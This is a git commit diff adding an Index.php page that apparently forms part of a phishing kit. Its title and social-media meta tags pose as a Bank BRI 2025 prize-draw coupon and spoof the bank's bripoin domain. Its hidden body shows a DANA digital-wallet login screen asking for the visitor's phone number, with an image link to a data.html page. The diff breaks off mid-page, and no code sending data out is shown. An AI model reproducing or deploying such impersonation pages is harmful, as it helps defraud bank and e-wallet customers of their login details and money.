018543bed711059f131c02b7d1768f0f1f6f8b04
yohost26 <rendianapratama41@gmail.com>
2025-05-17 17:50:06 +0700

    Index.html

---
+++ Index.php
@@ -0,0 +1,91 @@
+<DOCTYPE html>
+<html lang="en" >
+<head>
+    <!-- Warna untuk Chrome, Firefox OS, Opera dan Vivaldi -->
+<meta content='#0F78CB' name='theme-color'/>
+<!-- Warna untuk Windows Phone -->
+<meta content='#1A89DF' name='msapplication-navbutton-color'/>
+<!-- Warna untuk iOS Safari -->
+ <meta charset="utf-8"> 
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#1E90FF"> 
+   <!-- HTML Meta Tags -->
+
+  <title>𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟱</title>
+
+  <meta name="description" content="PT. Bank Rakyat Indonesia (Persero) Tbk.
+  Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia.">
+
+  <!-- Facebook Meta Tags -->
+  <meta property="og:url" content="https://bripoin.bri.co.id">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟱">
+  <meta property="og:description" content="PT. Bank Rakyat Indonesia (Persero) Tbk.
+  Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia.">
+  <meta property="og:image" content="https://hosting.tigerengine.id/rqzjod.jpg">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="bripoin.bri.co.id">
+  <meta property="twitter:url" content="https://bripoin.bri.co.id">
+  <meta name="twitter:title" content="𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟱">
+  <meta name="twitter:description" content="PT. Bank Rakyat Indonesia (Persero) Tbk.
+  Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia.">
+  <meta name="twitter:image" content="https://hosting.tigerengine.id/rqzjod.jpg">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+<link rel="icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgO_KJKoiNoIOuh2awDawBIzbhPGD8ZE4TQ2Lzyo2PyR4INOQozVU1zIwCJXeS3T_ZhCnXxdoYusOrUPXuuMF1k-9P3jpaV1SLE9L0WQrdMN72HbXyIc0uDJOF04L_GChyphenhyphenUilXS-nc35hyJaBkonxSZr14jTnIWJE8MXDHo_-G5nfONdgw9zPpI1CPwFhs/s100/AddText_10-22-11.27.51.jpg" type="image/x-icon" />
+<link rel="apple-touch-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipe73s-3CcYv1XXmiOtnfFSKYbs7EFK5AJb1P4Jj-6LiXpr7qbbsnoHWxM-MG6cHMlkZu6V342OuENy8Evo_MoLlFzmub-d7VFYcBycMykKax6G8XaoMGi_IhqDZzVm9Sv05nTWxEDe82lnuwS4ln0HnG6VE0sGqhO70WQflrIt5RuY8lZIDftN9qwk4Q/s1080/AddText_10-22-11.27.23.jpg" />
+  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+        
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<link rel="stylesheet" href="./style.css">
+
+    
+    <!-- Demo styles -->
+    <style>
+      html,
+      body {
+        position: relative;
+        height: 100%;
+		overflow: hidden; 
+        background-color: #fff;
+        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        color: #000;
+        margin: 0;
+        padding: 0;
+      }
+
+	</style>
+</head>
+<body style="background-color: #fff;">
+    <div style="display:none;" class="index">
+        <div class="header">
+            
+        </div>
+        <div class="content">
+            <div class="hero">
+                
+            </div>
+            <h1>Dompet digital untuk kamu!</h1>
+            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
+            <div class="line">
+            </div>
+            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
+            <button type="button" onclick="next();">LOGIN</button>
+        </div>
+    </div>
+    <div class="start" style="display:none; background-color: #fff;">
+        
+    </div>
+    <div class="container hid">
+        <div class="box-login" style="background-color: #fff;">
+            <div id="process" name="process" class="process" style="display: none;">
+                <div class="loading">
+                    
+                </div>
+            </div>
+            <div class="header11">
+                <a href="data.html"><img src="https://raw.githubusercontent.com/yohost26/Save-web-as-zip/7e3792f8da9ba3f6740550651c5d0014f9168c37/y.png" style="width: 100%; left: 0px; top: 0px; height: 95%"></a>
+            </div>
